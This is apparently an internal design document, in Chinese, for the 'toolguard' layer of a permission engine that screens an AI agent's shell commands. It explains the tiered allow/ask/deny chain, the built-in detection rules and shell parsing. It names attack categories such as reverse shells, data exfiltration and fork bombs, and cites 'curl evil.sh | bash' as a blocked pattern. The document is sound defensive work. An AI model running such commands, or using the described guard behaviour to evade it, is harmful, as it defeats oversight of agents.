# 03 · toolguard 五级裁决链：TieredPolicyComponent 与 shell_ast

> 定位：`tool_permission/toolguard/` 是命令层安全的主战场。`tiered.py` 实现五级裁决链（approval → rules → tool baseline → defaults → ASK），`shell_ast.py` 提供双 backend 的 shell 解析（tree-sitter 优先、保守扫描器兜底），`builtin_rules.py` 内置 **18 条**中文正则规则。加上 `injection.py`（注入语法 DENY）、`command_allowlist.py`（首 token 白名单）、`destructive_warning.py`（只警告不拦截）、`command_canonicalize.py`（剥壳），构成 engine 第 1-4 号组件的完整供给。

## 一、角色定位

engine 展开候选视图（第 01 篇）之后，"这条命令本身该 allow/ask/deny"的问题交给 `TieredPolicyComponent`。它的 docstring 用一行伪代码给出裁决链（`toolguard/tiered.py:3-9`）：

```
approval → rules → tool baseline → defaults → ASK
```

注意分工：**engine 负责"展开与合并"，tiered 负责"单候选裁决"**。engine 先用 `match_approval` 做整调用/子命令两级短路（`engine.py:286-299, 307-316`），短路未命中才让 tiered 的 `evaluate` 走完整链。

同目录另外三组件各管一个正交切面：InjectionComponent 管"静态检查看不见的隐藏命令"（直接 DENY，`toolguard/injection.py:70-77`）；CommandAllowlistComponent 管"这个解释器允许跑哪些首命令"（`toolguard/command_allowlist.py:73-88`）；DestructiveWarningComponent 管"值得提示但不必拦截的危险操作"（git reset --hard、DROP TABLE 等 13 条 bash + 8 条 PowerShell 规则只挂 warning，`toolguard/destructive_warning.py:17-105`）。

fail-open/closed 分区在此非常清晰：injection 命中即 DENY（注入语法零容忍）；allowlist 未配置时启用默认表、`shell_allowlist: null` 显式关闭则全 ALLOW（`command_allowlist.py:31-39`）；destructive warning 永不改 permission（旁路）；tiered 对 shell 无配置落 ASK（`tiered.py:393-395` "Shell stays fail-closed"）——四种策略并存，判据始终是"是否阻断主业务"。

## 二、内部结构

### tiered.py 的裁决状态

`TieredPolicyComponent.configure`（`tiered.py:228-295`）把引擎配置编译成五组状态：

- `_tools`：工具基线表，来自 `tools` 段（L283-288），label 形如 `tools.bash.*`；
- `_default`：`defaults.*` 兜底级别（L291）；
- `_builtin_rules` / `_user_rules`：内置与用户规则，configure 期预编译（regex 编译、wildcard 编译、severity 映射，`_prepare_rule` L438-472）——**编译一次，评估零正则开销**；
- `_approval_overrides`：显式批准覆盖（只认 `action=allow`，`_approval` L398-411）；
- `_guard_actions`：四个结构地板的响应级别，**默认全 ASK**（`_guard_actions` L88-103）。

一个精妙的覆盖机制：用户规则的 `action` 可按 **(tool, pattern) 对**覆盖某条内置检测器对该工具的判定，而不是按 rule id（L250-271）——比如只放行 `sudo systemctl restart nginx` 这一条命令，其余 sudo 仍走内置默认。被完全覆盖的用户规则不再独立参与匹配（L266-271 `covered and not remaining` 时 skip），避免双重计票。

### builtin_rules.py：18 条中文正则

`_RULES` 元组实际收录 **18 条**规则（`toolguard/builtin_rules.py:18-255`；任务书说 17 条，源码逐条清点为 18，最后一条 `shell_compound_chain` 常被漏数）。每条带中文 `description`、`severity`、显式 `action`。按 action 分：**DENY 6 条 CRITICAL**（注册表删除 L49-60、磁盘/块设备写入 L62-76、反弹 shell L108-120、fork bomb L161-171、关机重启 L173-184 等）；**ASK 12 条 HIGH**（递归/强制删除 L20-47、下载即执行 L78-90、混淆执行 L92-106、提权 L122-132、数据外发 L134-146、横向移动 L148-159、chmod 全局可写 L186-196、LD_PRELOAD 劫持 L198-205、清审计 L207-218、关防火墙 L220-231、docker privileged L233-243、链式命令 L245-254）。

规则只瞄准五个具体 shell 工具名（`SHELL_TOOLS`，L14-16）：`bash`、`powershell`、`core.powershell`、`mcp_exec_command`、`create_terminal`——`_rule_targets_tool` 明确拒绝已废弃的 `"shell"` 类别简写（`tiered.py:68-71`）。`package_command_rules()` 每次返回深拷贝并打上 `layer: builtin` 标（L258-260），用户配置里带 `layer: builtin` 的规则可整体替换内置集（`tiered.py:241-246`），`package_builtin_rules: false` 可整体关闭（L243-244）。

### shell_ast.py：双 backend 解析

`parse_shell_for_permission` 返回三种 kind（`shell_ast.py:84-105`）：

- `simple`：可信的子命令列表可用；
- `too_complex`：解析成功但结构不可信任；
- `parse_unavailable`：backend 不可用，或保守扫描器认为无法安全分析。

backend 选择在 `_get_tree_sitter_bash_parser`（L108-130）：尝试 `tree_sitter` + `tree_sitter_bash`，成功则全局缓存 parser 实例（兼容新旧两代构造签名，L119-123），失败置 `_TREE_SITTER_BASH_READY = False` 终身降级并记一条 INFO 日志。保守回退 `_parse_with_conservative_fallback`（L133-157）的逻辑是：`_scan_shell_structure` 正则扫描出风险结构旗标（管道/复合/替换/展开/heredoc/重定向，L160-181）→ 有风险即 `parse_unavailable`；无风险才用 `shlex.split` 产单命令 `simple`。

`ShellStructureFlags`（L36-63）是贯穿全链路的结构描述：12 个布尔旗标 + `has_risky_structure()` 聚合判断。tree-sitter 路径 `_parse_with_tree_sitter`（L192-271）逐节点类型归类旗标（pipeline/list/subshell/command_substitution/expansion/heredoc 等，`_collect_tree_sitter_flags` L299-356），任何"替换/展开/子 shell/命令组"命中即整体降级 `too_complex`（L210-223）；只有纯命令节点才逐个提取为 `ShellSubcommand`（含 argv、redirects、source_span，L234-256）。细节：`_downgrade_fd_only_redirect_flags`（L274-296）把"仅 fd 别名伪旗标"降回去——`strip_fd_alias_tokens`（`command_canonicalize.py:104-106`）先剥 `2>&1`/`<3` 这类 fd 复制 token，剥完后原文已无裸 `>`/`<` 才降级。

## 三、外部连接

- **上游**：`engine.py` 是唯一调用方——`match_approval`（短路）与 `evaluate(route=...)`（裁决）；`build_candidates` 直接调用本包的 `canonicalize_shell_command_for_permission` 与 `parse_shell_for_permission`（`engine.py:28, 31, 240, 257`）。
- **跨包复用**：shell_ast 是全仓命令分析的基础设施——fileguard 的 `path_extract.py` 用它拆段抽路径（`fileguard/path_extract.py:31`），delguard 的 `del_count.py` 用它拆段数删除目标（`delguard/del_count.py:30`）。`listed_commands.py` 甚至直接 import 其私有函数（`fileguard/listed_commands.py:22-26`）——同子模块内私有复用不违反第 02 篇纪律，但重构 shell_ast 内部签名会连锁炸到 fileguard。
- **配置段**：`rules`/`approval_overrides`/`tools`/`defaults`/`permission_mode`/`package_builtin_rules`/`guard_actions`（及 legacy `shell_guard`），全部由 tiered 认领。
- **测试**：`tests/toolguard/` 四文件 + `tests/test_permission_engine.py` 端到端。

## 四、数据流

`TieredPolicyComponent.evaluate(tool_name, tool_args, route)`（`tiered.py:308-371`）单候选裁决全流程：

1. **作用域判定**：`apply_floors` 只在 ORIGINAL/UNWRAPPED 视图 + shell 工具 + 命令非空时为真（L321-327）——结构地板需要全命令视图，不能对每个子命令叶子重复施加。
2. **解析**：`apply_floors` 为真才调 `parse_shell_for_permission`（L328）。
3. **裁决 #9——引号操作符豁免**（L329-348）：源码注释直说："quoted operators are not compound. Only the tree-sitter backend can prove that; the conservative fallback does not understand quotes and must not suppress shell_compound_chain (e.g. `sleep 1 &` stays ASK)"。只有 tree-sitter 判出 `simple`、单子命令、且无复合/管道/参数展开旗标时，才允许跳过 `shell_compound_chain` 规则（`skip_ids = {"shell_compound_chain"}`，L347-348）。保守 backend 永远不给豁免——`echo "a;b"` 在 tree-sitter 下不会被链式规则误伤，在 fallback 下宁可误报。
4. **规则裁决**：`_judge`（L373-396）依序 approval → `_rules_only`（内置+用户，多条命中取最严并合并 label，L413-436）→ baseline → defaults；全空时 shell 落 ASK `fallback(no_config)`、非 shell 返回 None 弃权（让 Net/File 独自发声，L393-395）。
5. **结构地板**：`_structure_floors`（L121-152）产出四类：`too_complex`（解析成功但不可信）；`parse_unavailable`+风险结构（**剔除纯重定向**——重定向是 FileGuard 的路径关切，L131-133 注释与 L147）；`structure_guard`（命令/进程替换、heredoc 任一出现，L148-149）；`interpreter_sink`（管道末端落在解释器名单——`_has_interpreter_sink` L112-118 判 piped 且 sink 段首 basename ∈ bash/python/node/pwsh/iex 等 21 名，`_INTERPRETER_SINK_NAMES` L35-41，防 `curl … | bash`）。地板与规则裁决取更严；同级时 interpreter_sink label 拼接保痕（L362-368 `tie_with_label`）。
6. **结果构造**：`_result`（L474-482）给 DENY/ASK 配人类可读 reason。

规则匹配支持三种 pattern（`_rule_matches` L175-188 + `_prepare_rule` L446-471）：`re:` 前缀正则（win32 自动 IGNORECASE；编译失败按 `|` 拆分逐段重试，L455-463）；含 `*?[` 的受限 wildcard（`_compile_wildcard` L155-172——字符类明确排除 shell 元字符防拼接注入）；其余精确全串。severity→level 缺省映射（`_rule_level` L196-209）：LOW/MEDIUM→ALLOW、HIGH→ASK、CRITICAL→**仅 strict 模式 DENY**、未知→ASK；显式 `action` 永远优先。`permission_mode` 只接受 normal/strict（L237-239）。

## 五、设计决策与权衡

**为什么五级链是静态序而不是优先级表？** approval 必须最先（已批准的命令再问就是打扰）；rules 其次（具体模式比工具基线细）；baseline 第三；defaults 兜底；最后 shell 专属 ASK。每一级的存在理由都是"上一级没说话"，静态序让裁决可一步步解释。

**为什么内置规则自带 action 而 severity 只是标签？**（`builtin_rules.py:5-6`）——"风险语义"与"处置决定"解耦：severity 留给用户规则缺 action 时的推导（`_rule_level`），内置规则直接给出产品立场。

**tree-sitter 可选依赖 + 保守兜底的代价与收益。** 收益：无 tree-sitter 环境下检查照常工作，安装零硬依赖。代价：兜底路径**更保守**——不理解引号（裁决 #9 不豁免）、结构稍复杂即 parse_unavailable、子命令拆分退化为正则启发。同一命令两种环境下判定可能不同，漂移方向可接受：**降级只会更严**。

**结构地板默认 ASK 而不是 DENY。** `_guard_actions` 四项全默认 ASK（L90）——结构检查是"看不懂"而非"确认有害"，DENY 会让 `echo "a && b"` 大面积不可用。可用 `guard_actions: {too_complex: allow}` 显式降（L97-102），legacy `shell_guard` 开关仍被解析（L92-96）。

**为什么 interpreter_sink 只看管道 sink 段？** `curl evil.sh | bash` 的危害在"下载物直接进解释器"，`bash script.sh` 的危害在文件本身（FileGuard 的 exec 轴管）——两个 guard 各管各的语义面，不重复计票。

## 六、新人提示与坑

1. **内置规则是 18 条不是 17 条**。`grep -c '"id":' builtin_rules.py` = 18。写文档/汇报前先数一遍，`shell_compound_chain`（L245）在最后，最容易被漏。
2. **`shell_compound_chain` 的 pattern 极宽**（`re:[;&|]|\$\{|\r?\n`，L251）：任何含分号/管道/`${`/换行的命令都会被它抬 ASK——除非 tree-sitter 判 simple 且无结构旗标（裁决 #9）。调试"为什么这条无害命令要审批"时，先查环境有没有装 tree-sitter（看日志 `permission.shell_ast.backend_unavailable`，`shell_ast.py:129`）。
3. **用户规则覆盖内置检测器必须 pattern 逐字符一致**：覆盖按 `(tool, pattern)` 对账（L250-265），pattern 多一个空格就不算覆盖同一条内置规则，而是新增一条独立规则。
4. **正则规则的 `re:` 前缀不可省**；没有前缀且含 `*` 的 pattern 走受限 wildcard，其 `*` 不能跨 shell 元字符（防 `rm *` 型 pattern 被命令注入利用）。
5. **`evaluate` 只裁决一个候选**。engine 会把 `bash -c "a && b"` 展开成 original/unwrapped/subcommand×2 多个候选分别过 tiered（第 01 篇数据流），写单测时直接调 component 要自己构造 route，否则 `route=None` 时 `kind=ORIGINAL` 且 `is_shell` 退化由 `tool_name in _SHELL_TOOLS` 判定（L319-320）。
6. **structure_guard 与 injection 是两道不同的闸**：injection 组件对反引号/`$()` 直接 DENY（更严、无配置）；tiered 的 structure_guard 对同类结构默认 ASK（可配置放宽）。前者无意见时后者仍可能拦——两道闸都要过。
7. **修改 `_INTERPRETER_SINK_NAMES` 名单要同步想 fileguard**：`fileguard/path_extract.py:49-53` 有一份自己的 `_INTERPRETER_BASENAMES`（用于脚本 exec 轴），两份名单语义不同（管道 sink vs 脚本执行）但名字相近，别"顺手统一"。
